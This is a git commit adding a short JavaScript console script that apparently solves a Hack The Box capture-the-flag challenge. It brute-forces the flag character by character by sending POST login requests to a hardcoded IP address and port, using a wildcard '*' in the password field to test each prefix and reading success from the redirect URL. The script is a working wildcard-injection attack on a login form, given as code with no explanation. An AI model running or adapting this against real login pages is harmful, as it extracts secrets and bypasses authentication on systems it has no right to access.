43e0f19c43dcac471d29f8471e7735ca1e4bd720
Aghilan Baskar <42873145+aghilanbaskar@users.noreply.github.com>
2021-05-08 16:01:31 +0530

    Create console.script.js
    script added

---
+++ console.script.js
@@ -0,0 +1,29 @@
+findFlag = async () => {
+    let atoz = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
+    localStorage.setItem("flag", '');
+    let isSearch = true;
+    while(isSearch){
+        isSearch = false;
+        for(i=0;i<atoz.length;i++){
+            console.log(localStorage.getItem("flag")+atoz[i]);
+            let rq = await fetch('http://206.189.121.131:31042/login', {
+                method: 'POST',
+                body: new URLSearchParams({
+                    'username': 'reese',
+                    'password': 'HTB{'+localStorage.getItem("flag")+atoz[i]+'*}'
+                })
+            });
+            if(rq.url === 'http://206.189.121.131:31042/'){
+                updatedPass = localStorage.getItem("flag")+atoz[i];
+                localStorage.setItem("flag", updatedPass);
+                console.clear();
+                console.log(localStorage.getItem("flag"));
+                isSearch = true;
+            }
+        }
+    }
+    console.clear();
+    console.log('Flag is');
+    console.log(localStorage.getItem("flag"));
+}
+findFlag();
